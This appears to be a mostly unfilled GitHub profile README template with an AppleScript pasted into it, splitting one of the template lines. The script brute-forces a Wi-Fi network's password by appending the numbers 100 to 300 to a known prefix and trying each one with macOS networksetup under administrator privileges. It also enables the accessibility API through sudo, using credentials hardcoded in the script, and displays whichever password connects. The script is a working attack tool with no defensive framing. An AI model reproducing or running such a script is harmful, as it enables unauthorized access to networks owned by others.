- 👋 Hi, I’m @Tyty100
# Change the variables
set BSSID to "NetworkBSSID"
set startString to "pwdStartString"
set computerUsername to "username"
set computerPassword to "password"

# Enables Accessibility
do shell script "sudo touch /private/var/db/.AccessibilityAPIEnabled" user name computerUsername password computerPassword with administrator privileges

# Set your desired password range to try
repeat with ink from 100 to 300
	set myPassword to startString & ink
	try
		set error to "none"
		do shell script "networksetup -setairportnetwork" & space & quoted form of BSSID & space & quoted form of myPassword with administrator privileges
	on error errStr
		set error to errStr
	end try
	if error = "none" then
		display alert "Password is: " & myPassword
		exit repeat
	end if
end repeat- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
Tyty100/Tyty100 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
